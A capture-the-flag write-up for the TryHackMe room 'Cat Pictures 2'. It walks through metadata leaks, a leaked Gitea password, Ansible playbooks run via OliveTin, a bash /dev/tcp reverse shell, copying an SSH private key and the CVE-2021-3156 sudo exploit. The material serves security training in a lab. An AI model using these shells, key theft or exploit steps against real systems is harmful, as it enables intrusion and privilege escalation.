# Cat Pictures 2

A writeup for the room [Cat Pictures 2](https://tryhackme.com/room/catpictures2) on TryHackMe.

> Now with more Cat Pictures!

<Image src={require("./logo.webp").default} height="256" />

Main parts of the room:

- Reading image metadata
- Accessing Gitea and editing files using Git or in-browser editor
- Runnig custom Ansible tasks through OliveTin
- Exploiting CVE-2021-3156

## Footprinting

Firstly, we can start with a nmap scan.

We find five open ports with three web servers publicly accessible.

```bash
nmap -sS <HOST>
```

<Image src={require("./nmap.webp").default} />

```
22 -> SSH
80 -> Lychee Photo Album
222 -> Gitea SSH (?)
3000 -> Gitea
8080 -> python server (?)
```

## First flag

### Finding interesting metadata

We can begin by looking inside the Lychee Photo Album.

In the info of the first image we can find a message about stripping away the metadata.

<Image src={require("./image.webp").default} />

Once the image is downloaded, we can check its metadata to find an url to a secret txt note.

```
exiftool image.jpg
```

<Image src={require("./metadata.webp").default} />

### The secret note

The url is `:8080/764efa883dda1e11db47671c4a3bbd9e.txt`

```
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

### Accessing Gitea

Now, we have the credentials for the Gitea instance.

Once logged in, we can see a repository called `ansible`.

<Image src={require("./repo.webp").default} />

Inside the repository there is a file called `flag1.txt`. Open it to get the first flag.

## Second flag

### Running Ansible tasks using OliveTin

From the secret note, we know that Ansible is accessible on the port 1337.

There we can find a OliveTin instance that allows to run the Ansible tasks.

<Image src={require("./ansible.webp").default} />

### Editing the playbook

It is possible to change the script `playbook.yml` through Gitea and then run it from OliveTin.

If you prefer you can also configure the ssh access and modify it from your machine.

<Image src={require("./edit.webp").default} />

Firstly, we can print the content of the home folder.

Following the example script, this is a possible solution.

```yaml
---
- name: Test
  hosts: all
  remote_user: bismuth
  tasks:
    - name: print home folder
      become: false
      command: ls -lR ~
      register: ls_content
      changed_when: false

    - debug: var=ls_content
```

Run the script and check the output.

We can see that in the home folder there is a file called `flag2.txt`.

We can edit again the script to print the content of the flag.

```yaml
---
- name: Test
  hosts: all
  remote_user: bismuth
  tasks:
    - name: print flag2
      become: false
      command: cat flag2.txt
      register: flag2
      changed_when: false

    - debug: var=flag2
```

<Image src={require("./ansible-output.webp").default} />

If you check the output, you can see the second flag.

## Third flag

### Obtaining a reverse shell

For the third flag, it is better to use a reverse shell.

Remember to listen with:

```bash
nc -nlvp <PORT>
```

To check your IP use:

```bash
ifconfig
```

In this Gist you can find an example:

<Gist id="32ccf1baaa3066654a460265fca53960" />

```yaml
---
- name: Test
  hosts: all
  remote_user: bismuth
  tasks:
    - name: rev
      shell: bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'
```

<Image src={require("./rev.webp").default} />

### Stealing ssh keys

To make the work easier, we can also steal the ssh key.

It is enough to copy the content of `~/.ssh/id_rsa` and paste it in a file on our machine.

Then, we can use the command `ssh -i <FILE> bismuth@<HOST>` to login.

### Exploiting CVE-2021-3156

We can try with LinPeas and LinEnum, but a faster way is to exploit the CVE-2021-3156 vulnerability.

[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

Download the file from the github repo and copy them on the machine.

After that, follow the instructions to exploit the vulnerability.

In the end, you should run something like this:

```bash
# build the exploit
make

# obtain a list of possible targets
./sudo-hax-me-a-sandwich

# select a target
./sudo-hax-me-a-sandwich 0
```

The third flag is in the root folder.

<Image src={require("./pe.webp").default} />
